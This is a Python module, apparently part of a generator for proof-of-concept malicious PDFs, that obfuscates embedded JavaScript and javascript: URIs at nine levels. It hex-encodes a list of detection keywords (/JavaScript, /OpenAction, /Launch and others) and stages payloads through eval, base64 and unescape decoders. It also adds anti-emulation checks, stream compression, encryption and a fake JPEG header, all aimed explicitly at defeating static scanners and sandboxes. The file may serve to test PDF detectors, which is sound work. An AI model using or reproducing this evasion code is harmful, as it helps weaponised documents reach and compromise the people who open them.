import base64
import io
import random
import re
import zlib


def _name_to_hex(name_bytes):
    """Encode a PDF name token using #XX hex escapes. E.g. b'/JavaScript' -> b'/#4a#61#76#61#53#63#72#69#70#74'."""
    if not name_bytes.startswith(b'/'):
        return name_bytes
    encoded = b'/'
    for byte in name_bytes[1:]:
        if random.random() < 0.7:  # encode ~70% of chars for variation
            encoded += b'#' + format(byte, '02x').encode()
        else:
            encoded += bytes([byte])
    return encoded


def _string_to_octal(match):
    """Convert a PDF literal string (xxx) to octal escapes."""
    content = match.group(1)
    result = b'('
    for byte in content:
        if byte in (0x28, 0x29, 0x5c):  # ( ) \ must stay escaped
            result += b'\\' + bytes([byte])
        elif random.random() < 0.6:
            result += b'\\' + format(byte, '03o').encode()
        else:
            result += bytes([byte])
    result += b')'
    return result


def _string_to_hex(match):
    """Convert a PDF literal string (xxx) to hex string <XX XX>."""
    content = match.group(1)
    hex_bytes = b'<'
    for byte in content:
        hex_bytes += format(byte, '02x').encode()
        if random.random() < 0.3:
            hex_bytes += b' '  # random whitespace
    hex_bytes += b'>'
    return hex_bytes


def _obfuscate_js_payload(js_bytes):
    """Obfuscate JavaScript code using eval + String.fromCharCode.

    Used by Level 4 staging for browser-API JS payloads (test33_9..12) where
    Acrobat-specific decoders like util.streamFromString are unavailable.
    """
    codes = ','.join(str(b) for b in js_bytes)
    return f'eval(String.fromCharCode({codes}))'.encode()


def _obfuscate_js_payload_b64(js_bytes):
    """Obfuscate JS by base64-encoding it and decoding via Acrobat util APIs.

    Wraps the original payload in:
        eval(util.stringFromStream(util.streamFromString("BASE64"),"base64"))

    Inspired by the April 2026 Adobe Reader 0-day blog sample which staged
    its payload through util.stringFromStream / SOAP.streamDecode.
    """
    b64 = base64.b64encode(js_bytes).decode('ascii')
    return (
        f'eval(util.stringFromStream('
        f'util.streamFromString("{b64}"),"base64"))'
    ).encode('latin-1')


def _obfuscate_js_unescape(js_bytes):
    """Wrap JS payload in eval(unescape("%XX%XX..."))."""
    escaped = ''.join(f'%{b:02x}' for b in js_bytes)
    return f'eval(unescape("{escaped}"))'.encode('latin-1')


def _wrap_anti_emulation(js_bytes):
    """Guard JS execution behind Acrobat/Reader environment checks."""
    js = js_bytes.decode('latin-1')
    wrapper = (
        'if(typeof app!=="undefined"&&typeof event!=="undefined"'
        '&&typeof app.viewerVersion!=="undefined"){'
        'try{if(event.target.zoomType!=null){' + js + '}}'
        'catch(_e){' + js + '}}'
    )
    return wrapper.encode('latin-1')


# Heuristic: substrings that indicate a JS payload targets PDF.js / browser APIs
# rather than Acrobat. Used by Level 4 to pick the right wrapper.
_BROWSER_API_HINTS = (b'fetch(', b'XMLHttpRequest', b'new Image', b'WebSocket')


def _rewrite_js_blocks(data, transform):
    """Rewrite every /JS (...) payload in `data` via `transform(bytes) -> bytes`.

    Walks paren depth manually so it handles arbitrarily nested parens and PDF
    backslash escapes inside the payload — unlike a flat regex which can only
    handle one level of nesting. Used by both Level 2 (bracket notation) and
    Level 4 (payload staging).
    """
    pattern = re.compile(rb'/JS\s*\(')
    out = bytearray()
    pos = 0
    while True:
        m = pattern.search(data, pos)
        if not m:
            out.extend(data[pos:])
            break
        out.extend(data[pos:m.end()])  # everything up to and including the (
        depth = 1
        i = m.end()
        while i < len(data) and depth > 0:
            c = data[i]
            if c == 0x5c:  # backslash escape — skip the next byte
                i += 2
                continue
            if c == 0x28:  # (
                depth += 1
            elif c == 0x29:  # )
                depth -= 1
                if depth == 0:
                    break
            i += 1
        if depth != 0:
            # Unbalanced — bail and emit the rest as-is
            out.extend(data[m.end():])
            return bytes(out)
        content = data[m.end():i]
        out.extend(transform(content))
        out.extend(b')')
        pos = i + 1
    return bytes(out)


def _obfuscate_js_bracket_notation(js_bytes):
    """Replace common JS API dot notation with bracket notation."""
    js = js_bytes.decode('latin-1')
    replacements = [
        ('this.submitForm', 'this["submitForm"]'),
        ('this.getURL', 'this["getURL"]'),
        ('app.launchURL', 'app["launchURL"]'),
        ('app.openDoc', 'app["openDoc"]'),
        ('app.media.getURLData', 'app["media"]["getURLData"]'),
        ('app.setTimeOut', 'app["setTimeOut"]'),
        ('SOAP.connect', 'SOAP["connect"]'),
        ('SOAP.request', 'SOAP["request"]'),
        ('SOAP.streamDecode', 'SOAP["streamDecode"]'),
        ('RSS.addFeed', 'RSS["addFeed"]'),
        ('util.readFileIntoStream', 'util["readFileIntoStream"]'),
        ('util.stringFromStream', 'util["stringFromStream"]'),
        ('util.streamFromString', 'util["streamFromString"]'),
        ('this.importDataObject', 'this["importDataObject"]'),
    ]
    for old, new in replacements:
        js = js.replace(old, new)
    return js.encode('latin-1')


def _obfuscate_js_uri(uri_bytes):
    """Obfuscate a javascript: URI with case variation and whitespace."""
    uri = uri_bytes.decode('latin-1')
    if uri.lower().startswith('javascript:'):
        prefix = uri[:11]  # "javascript:"
        payload = uri[11:]
        # Random case variation
        obf_prefix = ''.join(
            c.upper() if random.random() < 0.5 else c.lower()
            for c in prefix[:-1]  # everything except ':'
        ) + ':'
        # Optionally insert tab/newline in protocol
        if random.random() < 0.5:
            pos = random.randint(1, len(obf_prefix) - 2)
            char = random.choice(['\t', '\n'])
            obf_prefix = obf_prefix[:pos] + char + obf_prefix[pos:]
        return (obf_prefix + payload).encode('latin-1')
    return uri_bytes


def _flate_encode_stream(data, stream_start, stream_end):
    """Replace a stream's raw content with FlateDecode compressed version."""
    raw_content = data[stream_start:stream_end]
    compressed = zlib.compress(raw_content)
    return compressed


def _ensure_pdf_eof(data):
    """Append a missing EOF marker so tolerant PDF parsers can load PoC files."""
    if b'%%EOF' in data[-2048:]:
        return data
    return data.rstrip() + b'\n%%EOF\n'


def obfuscate_pdf(filepath, level):
    """Apply obfuscation to a generated PDF file.

    Level 1: PDF name hex encoding + string octal/hex encoding
    Level 2: Level 1 + JS obfuscation + XSS URI variations
    Level 3: Level 2 + FlateDecode stream compression
    Level 4: Level 3 + JS payload staging (base64 / charcode decoder wrap)
    Level 5: Level 4 + JS unescape() encoding
    Level 6: Level 5 + fake file header
    Level 7: Level 6 + anti-emulation checks
    Level 8: Level 7 + best-effort empty-password PDF encryption
    Level 9: Level 8 + best-effort object streams
    """
    try:
        data = filepath.read_bytes()
    except Exception:
        return

    if not data.startswith(b'%PDF'):
        return

    # --- Level 4: JS payload staging (must run BEFORE Level 2 bracket notation) ---
    # Wrap the inner content of every /JS (...) block in a decoder stub so the
    # original API calls never appear as literal substrings. Bracket-notation
    # in Level 2 then operates on the OUTER wrapper, leaving the base64 blob
    # opaque to static scanners.
    if level >= 4:
        def _stage_js_content(js_content):
            if any(hint in js_content for hint in _BROWSER_API_HINTS):
                return _obfuscate_js_payload(js_content)
            return _obfuscate_js_payload_b64(js_content)

        data = _rewrite_js_blocks(data, _stage_js_content)

    # --- Level 5: JS unescape() encoding ---
    if level >= 5:
        data = _rewrite_js_blocks(data, _obfuscate_js_unescape)

    # --- Level 7: Anti-emulation environment checks ---
    # This intentionally favors Acrobat/Reader payloads; browser/PDF.js payloads
    # may not execute when this guard is enabled.
    if level >= 7:
        data = _rewrite_js_blocks(data, _wrap_anti_emulation)

    # --- Level 2: JavaScript + XSS obfuscation (applied BEFORE string encoding) ---
    if level >= 2:
        # Obfuscate JavaScript payloads using bracket notation.
        # Must run before level 1 string encoding mangles the JS content.
        data = _rewrite_js_blocks(data, _obfuscate_js_bracket_notation)

        # Obfuscate javascript: URIs with case variation
        data = re.sub(
            rb'javascript:[^\)"]+',
            lambda m: _obfuscate_js_uri(m.group(0)),
            data
        )

    # --- Level 1: Name and string obfuscation ---
    if level >= 1:
        # Obfuscate PDF name tokens that are detection keywords
        keywords = [
            b'/JavaScript', b'/OpenAction', b'/Launch', b'/SubmitForm',
            b'/GoToR', b'/GoToE', b'/ImportData', b'/Thread',
            b'/RichMedia', b'/EmbeddedFile', b'/XFA', b'/OCProperties',
        ]
        for kw in keywords:
            if kw in data:
                data = data.replace(kw, _name_to_hex(kw), 1)

        # Obfuscate /JS and /AA names (short, common detection targets)
        data = re.sub(rb'/JS\s*\(', lambda m: _name_to_hex(b'/JS') + b' (', data)
        data = re.sub(rb'/AA\s*<', lambda m: _name_to_hex(b'/AA') + b' <', data)

        # Obfuscate URL strings in /URI actions only (not FileSpec /F which needs literal URLs)
        # FileSpec URLs must stay literal for the viewer to make network requests
        def _maybe_hex_string(m):
            if random.random() < 0.5:
                return _string_to_hex(m)
            return _string_to_octal(m)

        # Only match URLs in /URI context (not preceded by /F or /FileSpec)
        data = re.sub(
            rb'(/URI\s*)\((https?://[^()]*)\)',
            lambda m: m.group(1) + _maybe_hex_string(re.match(rb'\((.*)\)', b'(' + m.group(2) + b')')),
            data
        )

    # --- Level 3: Stream compression ---
    if level >= 3:
        # Find uncompressed streams and compress them with FlateDecode
        # Pattern: << ... >> stream\n ... \nendstream
        # Only compress streams that don't already have a /Filter
        def _compress_stream(m):
            dict_content = m.group(1)
            stream_data = m.group(2)
            if b'/Filter' in dict_content:
                return m.group(0)  # already filtered, skip
            if len(stream_data) < 50:
                return m.group(0)  # too small, not worth it
            try:
                compressed = zlib.compress(stream_data)
                new_dict = re.sub(rb'/Length\s+\d+', b'/Length ' + str(len(compressed)).encode(), dict_content)
                if b'/Length' not in new_dict:
                    new_dict = new_dict.rstrip(b' >') + b' /Length ' + str(len(compressed)).encode()
                new_dict += b' /Filter /FlateDecode'
                return b'<< ' + new_dict + b' >>\nstream\n' + compressed + b'\nendstream'
            except Exception:
                return m.group(0)

        data = re.sub(
            rb'<<\s*(.*?)\s*>>\s*stream\n(.*?)\nendstream',
            _compress_stream,
            data,
            flags=re.DOTALL
        )

    # --- Level 9: Object streams (must run before encryption/headers) ---
    if level >= 9:
        try:
            from PyPDF2 import PdfReader, PdfWriter
            import io
            
            # Use strict=False to handle malformed files (like test36 without proper EOF)
            reader = PdfReader(io.BytesIO(_ensure_pdf_eof(data)), strict=False)
            writer = PdfWriter()
            writer.clone_document_from_reader(reader)
                
            # PyPDF2 will automatically use object streams if use_objstm is True
            # which is the default for PDF >= 1.5. We explicitly enable it just in case.
            writer.use_objstm = True
            
            out_stream = io.BytesIO()
            writer.write(out_stream)
            data = out_stream.getvalue()
        except Exception as e:
            print(f"      [!] Object Stream failed: {e}")
            pass # Keep original data if object streams fail

    # --- Level 8: Empty-password encryption (must run AFTER all other structure modifications) ---
    if level >= 8:
        try:
            from PyPDF2 import PdfReader, PdfWriter
            import io
            
            reader = PdfReader(io.BytesIO(_ensure_pdf_eof(data)), strict=False)
            writer = PdfWriter()
            writer.clone_document_from_reader(reader)
                
            # Encrypt with empty password
            writer.encrypt("", use_128bit=True)
            
            out_stream = io.BytesIO()
            writer.write(out_stream)
            data = out_stream.getvalue()
        except Exception as e:
            print(f"      [!] Encryption failed: {e}")
            pass # Keep original data if encryption fails

    # --- Level 6: Fake file headers (must run LAST as it breaks PDF structure for some parsers) ---
    if level >= 6:
        # Prepend fake JPEG header
        # JFIF header + some dummy data
        jpeg_header = b'\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00'
        # Add random padding between 100-300 bytes (spec allows up to 1024 bytes before %PDF)
        padding_len = random.randint(100, 300)
        padding = bytes([random.randint(0, 255) for _ in range(padding_len)])
        
        # Ensure total prepended data is < 1024 bytes (PDF spec)
        if len(jpeg_header) + len(padding) > 1000:
            padding = padding[:1000 - len(jpeg_header)]
            
        data = jpeg_header + padding + b'\n' + data

    filepath.write_bytes(data)
